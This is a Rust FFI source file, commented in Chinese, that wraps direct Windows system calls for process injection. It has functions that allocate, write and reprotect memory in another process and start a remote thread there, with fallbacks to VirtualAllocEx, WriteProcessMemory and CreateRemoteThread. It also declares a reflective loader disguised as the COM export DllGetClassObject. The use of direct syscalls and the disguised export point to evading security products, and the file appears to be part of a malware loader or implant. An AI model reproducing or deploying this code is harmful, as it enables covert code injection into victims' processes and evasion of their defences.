// FFI 桥接层 - 与 C/ASM 代码互操作
#![allow(non_camel_case_types)]
#![allow(dead_code)]

use std::ffi::c_void;
use windows::Win32::Foundation::*;
use windows::Win32::System::Diagnostics::Debug::{ReadProcessMemory, WriteProcessMemory};
use windows::Win32::System::Memory::*;
use windows::Win32::System::Threading::*;

// 系统调用函数签名
// 这些将在 build.rs 中链接到 native/ 目录的 C/ASM 代码

extern "C" {
    // 内存操作
    pub fn nt_allocate_virtual_memory(
        process_handle: isize,
        base_address: *mut *mut u8,
        zero_bits: usize,
        region_size: *mut usize,
        allocation_type: u32,
        protect: u32,
    ) -> i32;

    pub fn nt_write_virtual_memory(
        process_handle: isize,
        base_address: *mut u8,
        buffer: *const u8,
        buffer_size: usize,
        bytes_written: *mut usize,
    ) -> i32;

    pub fn nt_read_virtual_memory(
        process_handle: isize,
        base_address: *const u8,
        buffer: *mut u8,
        buffer_size: usize,
        bytes_read: *mut usize,
    ) -> i32;

    pub fn nt_protect_virtual_memory(
        process_handle: isize,
        base_address: *mut *mut u8,
        region_size: *mut usize,
        new_protect: u32,
        old_protect: *mut u32,
    ) -> i32;

    // 线程操作
    pub fn nt_create_thread_ex(
        thread_handle: *mut *mut std::ffi::c_void,
        desired_access: u32,
        object_attributes: *mut std::ffi::c_void,
        process_handle: isize,
        start_routine: *mut u8,
        argument: *mut u8,
        create_flags: u32,
        zero_bits: usize,
        stack_size: usize,
        maximum_stack_size: usize,
        attribute_list: *mut std::ffi::c_void,
    ) -> i32;

    // 进程操作
    pub fn nt_terminate_process(process_handle: isize, exit_status: i32) -> i32;

    pub fn nt_close(handle: isize) -> i32;

    // Reflective Loader (伪装成 COM 函数)
    pub fn DllGetClassObject(param: *mut u8) -> usize;
}

// NTSTATUS 状态码
pub const STATUS_SUCCESS: i32 = 0;
pub const STATUS_ACCESS_DENIED: i32 = -1073741790; // 0xC0000022

// 内存保护标志
pub const PAGE_NOACCESS: u32 = 0x01;
pub const PAGE_READONLY: u32 = 0x02;
pub const PAGE_READWRITE: u32 = 0x04;
pub const PAGE_EXECUTE: u32 = 0x10;
pub const PAGE_EXECUTE_READ: u32 = 0x20;
pub const PAGE_EXECUTE_READWRITE: u32 = 0x40;

// 内存分配类型
pub const MEM_COMMIT: u32 = 0x1000;
pub const MEM_RESERVE: u32 = 0x2000;
pub const MEM_RELEASE: u32 = 0x8000;

// 辅助函数
pub fn nt_success(status: i32) -> bool {
    status >= 0
}

// ============================================================================
// 直接系统调用包装器（调用 Native FFI 或 Windows API 作为后备）
// ============================================================================

/// 使用系统调用分配内存（带后备方案）
pub fn allocate_virtual_memory_ex(process_handle: HANDLE, size: usize) -> anyhow::Result<*mut u8> {
    unsafe {
        // 优先尝试直接系统调用
        let mut base_addr: *mut u8 = std::ptr::null_mut();
        let mut region_size = size;

        let status = nt_allocate_virtual_memory(
            process_handle.0 as isize,
            &mut base_addr,
            0,
            &mut region_size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );

        if nt_success(status) && !base_addr.is_null() {
            return Ok(base_addr);
        }

        // 后备方案：使用 Windows API
        let result = VirtualAllocEx(
            process_handle,
            None,
            size,
            VIRTUAL_ALLOCATION_TYPE(MEM_COMMIT | MEM_RESERVE),
            PAGE_PROTECTION_FLAGS(PAGE_READWRITE),
        );

        if result.is_null() {
            anyhow::bail!("Failed to allocate virtual memory");
        }

        Ok(result as *mut u8)
    }
}

/// 使用系统调用写入内存（带后备方案）
pub fn write_virtual_memory_ex(
    process_handle: HANDLE,
    base_address: *mut u8,
    buffer: &[u8],
) -> anyhow::Result<usize> {
    unsafe {
        // 优先尝试直接系统调用
        let mut bytes_written = 0usize;

        let status = nt_write_virtual_memory(
            process_handle.0 as isize,
            base_address,
            buffer.as_ptr(),
            buffer.len(),
            &mut bytes_written,
        );

        if nt_success(status) && bytes_written > 0 {
            return Ok(bytes_written);
        }

        // 后备方案：使用 Windows API
        let mut api_bytes_written = 0usize;
        WriteProcessMemory(
            process_handle,
            base_address as *const c_void,
            buffer.as_ptr() as *const c_void,
            buffer.len(),
            Some(&mut api_bytes_written),
        )?;

        Ok(api_bytes_written)
    }
}

/// 使用系统调用读取内存（带后备方案）
pub fn read_virtual_memory_ex(
    process_handle: HANDLE,
    base_address: *const u8,
    size: usize,
) -> anyhow::Result<Vec<u8>> {
    unsafe {
        // 优先尝试直接系统调用
        let mut buffer = vec![0u8; size];
        let mut bytes_read = 0usize;

        let status = nt_read_virtual_memory(
            process_handle.0 as isize,
            base_address,
            buffer.as_mut_ptr(),
            size,
            &mut bytes_read,
        );

        if nt_success(status) && bytes_read > 0 {
            buffer.truncate(bytes_read);
            return Ok(buffer);
        }

        // 后备方案：使用 Windows API
        let mut api_bytes_read = 0usize;
        ReadProcessMemory(
            process_handle,
            base_address as *const c_void,
            buffer.as_mut_ptr() as *mut c_void,
            size,
            Some(&mut api_bytes_read),
        )?;

        buffer.truncate(api_bytes_read);
        Ok(buffer)
    }
}

/// 使用系统调用修改内存保护（带后备方案）
pub fn protect_virtual_memory_ex(
    process_handle: HANDLE,
    base_address: *mut u8,
    size: usize,
    new_protect: PAGE_PROTECTION_FLAGS,
) -> anyhow::Result<PAGE_PROTECTION_FLAGS> {
    unsafe {
        // 优先尝试直接系统调用
        let mut addr = base_address;
        let mut region_size = size;
        let mut old_protect = 0u32;

        let status = nt_protect_virtual_memory(
            process_handle.0 as isize,
            &mut addr,
            &mut region_size,
            new_protect.0,
            &mut old_protect,
        );

        if nt_success(status) {
            return Ok(PAGE_PROTECTION_FLAGS(old_protect));
        }

        // 后备方案：使用 Windows API
        let mut old_prot = PAGE_PROTECTION_FLAGS(0);
        VirtualProtectEx(
            process_handle,
            base_address as *const c_void,
            size,
            new_protect,
            &mut old_prot,
        )?;

        Ok(old_prot)
    }
}

/// 使用系统调用创建远程线程（带后备方案）
pub fn create_thread_ex(
    process_handle: HANDLE,
    start_address: *mut u8,
    param: *mut u8,
) -> anyhow::Result<HANDLE> {
    unsafe {
        // 优先尝试直接系统调用
        let mut thread_handle: *mut c_void = std::ptr::null_mut();

        let status = nt_create_thread_ex(
            &mut thread_handle,
            0x001F0000, // THREAD_ALL_ACCESS
            std::ptr::null_mut(),
            process_handle.0 as isize,
            start_address,
            param,
            0,
            0,
            0,
            0,
            std::ptr::null_mut(),
        );

        if nt_success(status) && !thread_handle.is_null() {
            return Ok(HANDLE(thread_handle as isize));
        }

        // 后备方案：使用 CreateRemoteThread Windows API
        let thread_proc: extern "system" fn(*mut c_void) -> u32 =
            std::mem::transmute(start_address as *const u8);

        let handle = CreateRemoteThread(
            process_handle,
            None,
            0,
            Some(thread_proc),
            Some(param as *mut c_void),
            0,
            None,
        )?;

        Ok(handle)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_nt_success() {
        assert!(nt_success(STATUS_SUCCESS));
        assert!(!nt_success(STATUS_ACCESS_DENIED));
    }

    #[test]
    fn test_constants() {
        assert_eq!(MEM_COMMIT, 0x1000);
        assert_eq!(MEM_RESERVE, 0x2000);
        assert_eq!(PAGE_READWRITE, 0x04);
    }
}
